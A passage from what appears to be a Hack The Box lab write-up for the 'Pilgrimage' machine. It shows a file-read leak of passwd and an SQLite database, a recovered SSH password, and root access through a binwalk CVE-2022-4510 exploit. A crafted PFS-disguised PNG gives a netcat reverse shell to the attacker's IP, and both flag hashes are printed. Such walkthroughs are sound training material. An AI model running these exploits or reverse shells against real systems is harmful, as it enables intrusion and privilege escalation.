systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

## Initial Access

Since arbitrary file read is poss and we confirmed that the user "emily" exists, the next initiative is to retrieve the password of an user.

Analyzing the source code from the dashboard.php file we are able to see that there is an SQLite DB running in the /var/db/pilgrimage directory.

Let's generate an file which should read the contents of the pilgrimage database.

```
python3 generate.py "/var/db/pilgrimage" -o exploit2.png
```

Uploaded the malicious .png file onto the server and downloaded the compressed .png file. We found a lot of hex values within the metadata of this file. Let's save it into db.hex and convert it to str.

```
wget http://pilgrimage.htb/shrunk/68f76715785f1.png
```
```
cat db.hex | xxd -r -p
��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))=indexsqlite_autoinde��▒-emilyabigchonkyboi123
��      emily
```

We gained the password of emily:emilyabigchonkyboi123, those creds didn't work. So I tested it like this
emily:abigchonkyboi123

Logged in successfully via ssh.

```
ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ 

```

Retrieved user.txt in /home/emily

```
1ace98d63606f2b3d0f91b9791d154fd
```


## Privilege Escalation


I found smth interesting, when displaying running processes on the target. An bash script being ran by root called "malwarescan.sh". Let's investigate it further.

```
ps -aux | grep "root"
root         679  0.0  0.0   6816  3072 ?        Ss   00:22   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

After some research and Vulnerability Assessment I came to the conclusion, that the script itself isn't exploitable. Since there is only absolute path's inside it. But the binary "binwalk" is vulnerable to CVE-2022-4510

```
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done

```
```
/usr/local/bin/binwalk -h
Binwalk v2.3.2
```

Let's download the exploit PoC from exploit-db on our local machine and execute it.

```
curl https://www.exploit-db.com/raw/51249 -o binwalk_exploit.py     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2803  100  2803    0     0   6227      0 --:--:-- --:--:-- --:--:--  6242
```

Created exploit3.png file, since the PoC requests an .png file.

```
touch exploit3.png
```

Ran PoC

```
python3 binwalk_exploit.py exploit3.png 10.10.14.186 1337
################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

Received binwalk_exploit.png file. Which acts as an .png file, but really is an PFS file.

```
xxd binwalk_exploit.png
00000000: 5046 532f 302e 3900 0000 0000 0000 0100  PFS/0.9.........
```

So since we have the payload now, we need to get the binary on the server and start our listener on the server, since the script is running automatically we will need to upload our payload in the /var/www/pilgrimage.htb/shrunk/ directory, since the script is running binwalk only on there.

```
nc -lvnp 1337
```
```
python3 -m http.server 80
```

Navigate into /var/www/pilgrimage.htb/shrunk/

```
wget http://10.10.14.186/binwalk_exploit.png -o binwalk.png
```

Gained RCE as Root 

```
nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.55.231] 41488
whoami
root
```

Performing Shell Hardening


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Retrieved root.txt in /root directory.

```
f0f642b34ab7bb3591cad7559ece58e0
```
